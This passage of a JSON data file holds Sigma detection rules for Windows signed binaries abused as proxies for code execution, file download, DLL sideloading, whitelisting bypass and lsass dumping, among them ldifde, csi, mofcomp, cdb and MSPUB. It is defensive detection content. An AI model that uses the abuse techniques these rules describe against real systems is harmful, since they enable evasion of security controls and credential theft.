                        "lookup_data": {
                            "description": "Detects the use of Ldifde.exe with specific command line arguments to potentially load an LDIF file containing HTTP-based arguments.\nLdifde.exe is present, by default, on domain controllers and only requires user-level authentication to execute.\n",
                            "raw": "author: '@gott_cyber'\ndate: 2022/09/02\ndescription: 'Detects the use of Ldifde.exe with specific command line arguments to\n  potentially load an LDIF file containing HTTP-based arguments.\n\n  Ldifde.exe is present, by default, on domain controllers and only requires user-level\n  authentication to execute.\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    CommandLine|contains|all:\n    - -i\n    - -f\n  selection_ldif:\n  - Image|endswith: \\ldifde.exe\n  - OriginalFileName: ldifde.exe.mui\nfalsepositives:\n- Unknown\nid: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/0gtweet/status/1564968845726580736\n- https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Ldifde Command Usage\n",
                            "sigma:id": "6f535e01-ca1f-40be-ab8d-45b19c0c8b7f",
                            "title": "Suspicious Ldifde Command Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "40b95d31-1afc-469e-8d34-9a3a667d058e",
                        "lookup_data": {
                            "description": "Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft “Roslyn” Community Technology Preview was named 'rcsi.exe'",
                            "raw": "author: Konstantin Grishchenko, oscd.community\ndate: 2020/10/17\ndescription: \"Csi.exe is a signed binary from Microsoft that comes with Visual Studio\\\n  \\ and provides C# interactive capabilities. It can be used to run C# code from a\\\n  \\ file passed as a parameter in command line. Early version of this utility provided\\\n  \\ with Microsoft \\u201CRoslyn\\u201D Community Technology Preview was named 'rcsi.exe'\"\ndetection:\n  condition: all of selection*\n  selection_cli:\n    Company: Microsoft Corporation\n  selection_img:\n  - Image|endswith:\n    - \\csi.exe\n    - \\rcsi.exe\n  - OriginalFileName:\n    - csi.exe\n    - rcsi.exe\nfalsepositives:\n- Legitimate usage by software developers\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 40b95d31-1afc-469e-8d34-9a3a667d058e\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Rcsi/\n- https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/\n- https://twitter.com/Z3Jpa29z/status/1317545798981324801\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1072\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Csi.exe Usage\n",
                            "sigma:id": "40b95d31-1afc-469e-8d34-9a3a667d058e",
                            "title": "Suspicious Csi.exe Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fe5ce7eb-dad8-467c-84a9-31ec23bd644a",
                        "lookup_data": {
                            "description": "Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, OSCD Community\"\ndate: 2020/10/05\ndescription: Detects SyncAppvPublishingServer process execution which usually utilized\n  by adversaries to bypass PowerShell execution restrictions.\ndetection:\n  condition: selection\n  selection:\n    ContextInfo|contains: SyncAppvPublishingServer.exe\nfalsepositives:\n- App-V clients\nid: fe5ce7eb-dad8-467c-84a9-31ec23bd644a\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nrelated:\n- id: fde7929d-8beb-4a4c-b922-be9974671667\n  type: derived\n- id: 9f7aa113-9da6-4a8d-907c-5f1a4b908299\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: SyncAppvPublishingServer Bypass Powershell Restriction - PS Module\n",
                            "sigma:id": "fe5ce7eb-dad8-467c-84a9-31ec23bd644a",
                            "title": "SyncAppvPublishingServer Bypass Powershell Restriction - PS Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1e59c230-6670-45bf-83b0-98903780607e",
                        "lookup_data": {
                            "description": "Detects the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy",
                            "raw": "author: frack113\ndate: 2022/05/16\ndescription: Detects the execution of the LOLBIN gpscript, which executes logon or\n  startup scripts configured in Group Policy\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - ' /logon'\n    - ' /startup'\n  selection_img:\n  - Image|endswith: \\gpscript.exe\n  - OriginalFileName: GPSCRIPT.EXE\nfalsepositives:\n- Legitimate uses of logon scripts distributed via group policy\nid: 1e59c230-6670-45bf-83b0-98903780607e\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n- https://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Gpscript Execution\n",
                            "sigma:id": "1e59c230-6670-45bf-83b0-98903780607e",
                            "title": "Gpscript Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0fa66f66-e3f6-4a9c-93f8-4f2610b00171",
                        "lookup_data": {
                            "description": "Detect usage of DLL \"coregen.exe\" (Microsoft CoreCLR Native Image Generator) binary to sideload arbitrary DLLs.",
                            "raw": "author: frack113\ndate: 2022/12/31\ndescription: Detect usage of DLL \"coregen.exe\" (Microsoft CoreCLR Native Image Generator)\n  binary to sideload arbitrary DLLs.\ndetection:\n  condition: selection and not filter\n  filter:\n    ImageLoaded|startswith:\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWOW64\\\n    - C:\\Program Files\\Microsoft Silverlight\\\n    - C:\\Program Files (x86)\\Microsoft Silverlight\\\n  selection:\n    Image|endswith: \\coregen.exe\nfalsepositives:\n- Unknown\nid: 0fa66f66-e3f6-4a9c-93f8-4f2610b00171\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Coregen/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1055\ntitle: Potential DLL Sideloading Using Coregen.exe\n",
                            "sigma:id": "0fa66f66-e3f6-4a9c-93f8-4f2610b00171",
                            "title": "Potential DLL Sideloading Using Coregen.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b30a8bc5-e21b-4ca2-9420-0a94019ac56a",
                        "lookup_data": {
                            "description": "VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsoft's recommended block rules.",
                            "raw": "author: Christopher Peacock @SecurePeacock, SCYTHE @scythe_io\ndate: 2022/06/01\ndescription: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass\n  and is listed in Microsoft's recommended block rules.\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\VisualUiaVerifyNative.exe\n  - OriginalFileName: VisualUiaVerifyNative.exe\nfalsepositives:\n- Legitimate testing of Microsoft UI parts.\nid: b30a8bc5-e21b-4ca2-9420-0a94019ac56a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/VisualUiaVerifyNative/\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n- https://bohops.com/2020/10/15/exploring-the-wdac-microsoft-recommended-block-rules-visualuiaverifynative/\n- https://github.com/MicrosoftDocs/windows-itpro-docs/commit/937db704b9148e9cee7c7010cad4d00ce9c4fdad\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Use of VisualUiaVerifyNative.exe\n",
                            "sigma:id": "b30a8bc5-e21b-4ca2-9420-0a94019ac56a",
                            "title": "Use of VisualUiaVerifyNative.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cd3d1298-eb3b-476c-ac67-12847de55813",
                        "lookup_data": {
                            "description": "Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.",
                            "raw": "author: Julia Fomina, oscd.community\ndate: 2020/10/09\ndescription: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d\n  option and executes the export specified in -p.\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' -d '\n    - ' -p '\n  selection_img:\n  - Image|endswith: \\rasautou.exe\n  - OriginalFileName: rasdlui.exe\nfalsepositives:\n- Unlikely\nid: cd3d1298-eb3b-476c-ac67-12847de55813\nlevel: medium\nlogsource:\n  category: process_creation\n  definition: Since options '-d' and '-p' were removed in Windows 10 this rule is\n    relevant only for Windows before 10. And as Windows 7 doesn't log command line\n    in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375\n    installed for command-line auditing (https://support.microsoft.com/en-au/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud)\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Rasautou/\n- https://github.com/fireeye/DueDLLigence\n- https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: DLL Execution via Rasautou.exe\n",
                            "sigma:id": "cd3d1298-eb3b-476c-ac67-12847de55813",
                            "title": "DLL Execution via Rasautou.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "646bc99f-6682-4b47-a73a-17b1b64c9d34",
                        "lookup_data": {
                            "description": "Detects file execution using the msdeploy.exe lolbin",
                            "raw": "author: Beyu Denis, oscd.community\ndate: 2020/10/18\ndescription: Detects file execution using the msdeploy.exe lolbin\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - verb:sync\n    - -source:RunCommand\n    - -dest:runCommand\n    Image|endswith: \\msdeploy.exe\nfalsepositives:\n- System administrator Usage\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 646bc99f-6682-4b47-a73a-17b1b64c9d34\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/\n- https://twitter.com/pabraeken/status/995837734379032576\n- https://twitter.com/pabraeken/status/999090532839313408\nstatus: test\ntags:\n- attack.execution\n- attack.t1218\ntitle: Execute Files with Msdeploy.exe\n",
                            "sigma:id": "646bc99f-6682-4b47-a73a-17b1b64c9d34",
                            "title": "Execute Files with Msdeploy.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aaf46cdc-934e-4284-b329-34aa701e3771",
                        "lookup_data": {
                            "description": "Execute VBscript code that is referenced within the *.bgi file.",
                            "raw": "author: Beyu Denis, oscd.community\ndate: 2019/10/26\ndescription: Execute VBscript code that is referenced within the *.bgi file.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - /popup\n    - /nolicprompt\n    Image|endswith: \\bginfo.exe\nfalsepositives:\n- Unknown\nid: aaf46cdc-934e-4284-b329-34aa701e3771\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/\n- https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Application Whitelisting Bypass via Bginfo\n",
                            "sigma:id": "aaf46cdc-934e-4284-b329-34aa701e3771",
                            "title": "Application Whitelisting Bypass via Bginfo",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d3bf399f-b0cf-4250-8bb4-dfc192ab81dc",
                        "lookup_data": {
                            "description": "Detect use of ie4uinit.exe to execute commands from a specially prepared ie4uinit.inf file from a directory other than the usual directories",
                            "raw": "author: frack113\ndate: 2022/05/07\ndescription: Detect use of ie4uinit.exe to execute commands from a specially prepared\n  ie4uinit.inf file from a directory other than the usual directories\ndetection:\n  condition: lolbin and not 1 of filter_*\n  filter_correct:\n    CurrentDirectory:\n    - c:\\windows\\system32\\\n    - c:\\windows\\sysWOW64\\\n  filter_missing:\n    CurrentDirectory: null\n  lolbin:\n  - Image|endswith: \\ie4uinit.exe\n  - OriginalFileName: IE4UINIT.EXE\nfalsepositives:\n- Unknown\nid: d3bf399f-b0cf-4250-8bb4-dfc192ab81dc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/16\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n- https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Ie4uinit Lolbin Use From Invalid Path\n",
                            "sigma:id": "d3bf399f-b0cf-4250-8bb4-dfc192ab81dc",
                            "title": "Ie4uinit Lolbin Use From Invalid Path",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e76c8240-d68f-4773-8880-5c6f63595aaf",
                        "lookup_data": {
                            "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, @oscd_initiative\"\ndate: 2020/10/06\ndescription: Detects usage of Time Travel Debugging Utility. Adversaries can execute\n  malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith:\n    - \\ttdrecord.dll\n    - \\ttdwriter.dll\n    - \\ttdloader.dll\nfalsepositives:\n- Legitimate usage by software developers/testers\nid: e76c8240-d68f-4773-8880-5c6f63595aaf\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Tttracer/\n- https://twitter.com/mattifestation/status/1196390321783025666\n- https://twitter.com/oulusoyum/status/1191329746069655553\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.credential_access\n- attack.t1218\n- attack.t1003.001\ntitle: Time Travel Debugging Utility Usage - Image\n",
                            "sigma:id": "e76c8240-d68f-4773-8880-5c6f63595aaf",
                            "title": "Time Travel Debugging Utility Usage - Image",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "961e0abb-1b1e-4c84-a453-aafe56ad0d34",
                        "lookup_data": {
                            "description": "Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe",
                            "raw": "author: Austin Songer (@austinsonger)\ndate: 2021/10/21\ndescription: Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe\n  and fltmc.exe\ndetection:\n  condition: selection and not filter\n  filter:\n    ParentImage|startswith:\n    - c:\\windows\\system32\\\n    - c:\\windows\\syswow64\\\n  selection:\n    Image|endswith:\n    - \\schtasks.exe\n    - \\systeminfo.exe\n    - \\fltmc.exe\n    ParentImage|endswith: \\stordiag.exe\nfalsepositives:\n- Legitimate usage of stordiag.exe.\nid: 961e0abb-1b1e-4c84-a453-aafe56ad0d34\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://strontic.github.io/xcyclopedia/library/stordiag.exe-1F08FC87C373673944F6A7E8B18CD845.html\n- https://twitter.com/eral4m/status/1451112385041911809\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Execution via stordiag.exe\n",
                            "sigma:id": "961e0abb-1b1e-4c84-a453-aafe56ad0d34",
                            "title": "Execution via stordiag.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a6fc3c46-23b8-4996-9ea2-573f4c4d88c5",
                        "lookup_data": {
                            "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).",
                            "raw": "author: frack113\ndate: 2021/07/13\ndescription: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable\n  that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    CommandLine|contains: 'Invoke-ATHRemoteFXvGPUDisablementCommand '\n  selection_opt:\n    CommandLine|contains:\n    - '-ModuleName '\n    - '-ModulePath '\n    - '-ScriptBlock '\n    - -RemoteFXvGPUDisablementFilePath\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nrelated:\n- id: 38a7625e-b2cb-485d-b83d-aff137d859f4\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Abusable Invoke-ATHRemoteFXvGPUDisablementCommand\n",
                            "sigma:id": "a6fc3c46-23b8-4996-9ea2-573f4c4d88c5",
                            "title": "Abusable Invoke-ATHRemoteFXvGPUDisablementCommand",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3b3c7f55-f771-4dd6-8a6e-08d057a17caf",
                        "lookup_data": {
                            "description": "Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary files",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary\n  files\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - http://\n    - https://\n    - ftp://\n  selection_img:\n  - Image|endswith: \\MSPUB.exe\n  - OriginalFileName: MSPUB.exe\nfalsepositives:\n- Unknown\nid: 3b3c7f55-f771-4dd6-8a6e-08d057a17caf\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218\ntitle: Download Arbitrary Files Via MSPUB.EXE\n",
                            "sigma:id": "3b3c7f55-f771-4dd6-8a6e-08d057a17caf",
                            "title": "Download Arbitrary Files Via MSPUB.EXE",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1dd05363-104e-4b4a-b963-196a534b03a1",
                        "lookup_data": {
                            "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a supsicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/12\ndescription: 'Detects execution of the \"mofcomp\" utility as a child of a suspicious\n  shell or script running utility or by having a supsicious path in the commandline.\n\n  The \"mofcomp\" utility parses a file containing MOF statements and adds the classes\n  and class instances defined in the file to the WMI repository.\n\n  Attackers abuse this utility to install malicious MOF scripts\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_case:\n  - ParentImage|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wsl.exe\n    - \\wscript.exe\n    - \\cscript.exe\n  - CommandLine|contains:\n    - \\AppData\\Local\\Temp\n    - \\Users\\Public\\\n    - \\WINDOWS\\Temp\\\n    - '%temp%'\n    - '%tmp%'\n    - '%appdata%'\n  selection_img:\n    Image|endswith: \\mofcomp.exe\nfalsepositives:\n- Unknown\nid: 1dd05363-104e-4b4a-b963-196a534b03a1\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/13\nreferences:\n- https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n- https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml\n- https://docs.microsoft.com/en-us/windows/win32/wmisdk/mofcomp\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1218\ntitle: Suspicious Mofcomp Execution\n",
                            "sigma:id": "1dd05363-104e-4b4a-b963-196a534b03a1",
                            "title": "Suspicious Mofcomp Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "53d4bb30-3f36-4e8a-b078-69d36c4a79ff",
                        "lookup_data": {
                            "description": "Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties.",
                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, @oscd_initiative\"\ndate: 2020/10/07\ndescription: Detects the execution of Xwizard tool with specific arguments which utilized\n  to run custom class properties.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|re: \\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\}\n    Image|endswith: \\xwizard.exe\nfalsepositives:\n- Unknown\nid: 53d4bb30-3f36-4e8a-b078-69d36c4a79ff\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Xwizard/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Custom Class Execution via Xwizard\n",
                            "sigma:id": "53d4bb30-3f36-4e8a-b078-69d36c4a79ff",
                            "title": "Custom Class Execution via Xwizard",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
                        "lookup_data": {
                            "description": "dotnet.exe will execute any DLL and execute unsigned code",
                            "raw": "author: Beyu Denis, oscd.community\ndate: 2020/10/18\ndescription: dotnet.exe will execute any DLL and execute unsigned code\ndetection:\n  condition: selection\n  selection:\n    CommandLine|endswith:\n    - .dll\n    - .csproj\n    Image|endswith: \\dotnet.exe\nfalsepositives:\n- System administrator Usage\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: d80d5c81-04ba-45b4-84e4-92eba40e0ad3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/\n- https://twitter.com/_felamos/status/1204705548668555264\n- https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/\nstatus: test\ntags:\n- attack.execution\n- attack.t1218\ntitle: Dotnet.exe Exec Dll and Execute Unsigned Code LOLBIN\n",
                            "sigma:id": "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
                            "title": "Dotnet.exe Exec Dll and Execute Unsigned Code LOLBIN",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "81ebd28b-9607-4478-bf06-974ed9d53ed7",
                        "lookup_data": {
                            "description": "Execute C# code located in the consoleapp folder",
                            "raw": "author: Beyu Denis, oscd.community\ndate: 2019/10/26\ndescription: Execute C# code located in the consoleapp folder\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\dnx.exe\nfalsepositives:\n- Legitimate use of dnx.exe by legitimate user\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/\n- https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1027.004\ntitle: Application Whitelisting Bypass via Dnx.exe\n",
                            "sigma:id": "81ebd28b-9607-4478-bf06-974ed9d53ed7",
                            "title": "Application Whitelisting Bypass via Dnx.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d22e2925-cfd8-463f-96f6-89cec9d9bc5f",
                        "lookup_data": {
                            "description": "Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files. It can be abused to run malicious \".xbap\" files any bypass AWL",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/01\ndescription: Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\"\n  (Browser Applications) files. It can be abused to run malicious \".xbap\" files any\n  bypass AWL\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    CommandLine|contains:\n    - C:\\Windows\\\n    - C:\\Program Files\n  selection_cli:\n    CommandLine|contains: .xbap\n  selection_img:\n  - Image|endswith: \\presentationhost.exe\n  - OriginalFileName: PresentationHost.exe\nfalsepositives:\n- Legitimate \".xbap\" being executed via \"PresentationHost\"\nid: d22e2925-cfd8-463f-96f6-89cec9d9bc5f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218\ntitle: Application Whitelisting Bypass via PresentationHost.exe\n",
                            "sigma:id": "d22e2925-cfd8-463f-96f6-89cec9d9bc5f",
                            "title": "Application Whitelisting Bypass via PresentationHost.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
                        "lookup_data": {
                            "description": "Detects usage of \"cdb.exe\" to launch 64-bit shellcode or arbitrary processes or commands from a debugger script file",
                            "raw": "author: Beyu Denis, oscd.community, Nasreddine Bencherchali\ndate: 2019/10/26\ndescription: Detects usage of \"cdb.exe\" to launch 64-bit shellcode or arbitrary processes\n  or commands from a debugger script file\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - ' -c '\n    - ' -cf '\n  selection_img:\n  - Image|endswith: \\cdb.exe\n  - OriginalFileName: CDB.Exe\nfalsepositives:\n- Legitimate use of debugging tools\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/04\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/\n- https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\n- https://twitter.com/nas_bench/status/1534957360032120833\nstatus: test\ntags:\n- attack.execution\n- attack.t1106\n- attack.defense_evasion\n- attack.t1218\n- attack.t1127\ntitle: WinDbg/CDB LOLBIN Usage\n",
                            "sigma:id": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
                            "title": "WinDbg/CDB LOLBIN Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dddfebae-c46f-439c-af7a-fdb6bde90218",
                        "lookup_data": {
                            "description": "Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
                            "raw": "author: \"Ensar \\u015Eamil, @sblmsrsn, OSCD Community\"\ndate: 2020/10/05\ndescription: Detects SyncAppvPublishingServer process execution which usually utilized\n  by adversaries to bypass PowerShell execution restrictions.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: SyncAppvPublishingServer.exe\nfalsepositives:\n- App-V clients\nid: dddfebae-c46f-439c-af7a-fdb6bde90218\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nrelated:\n- id: fde7929d-8beb-4a4c-b922-be9974671667\n  type: derived\n- id: 9f7aa113-9da6-4a8d-907c-5f1a4b908299\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: SyncAppvPublishingServer Execution to Bypass Powershell Restriction\n",
                            "sigma:id": "dddfebae-c46f-439c-af7a-fdb6bde90218",
                            "title": "SyncAppvPublishingServer Execution to Bypass Powershell Restriction",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c0b40568-b1e9-4b03-8d6c-b096da6da9ab",
                        "lookup_data": {
                            "description": "Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th postiional argument",
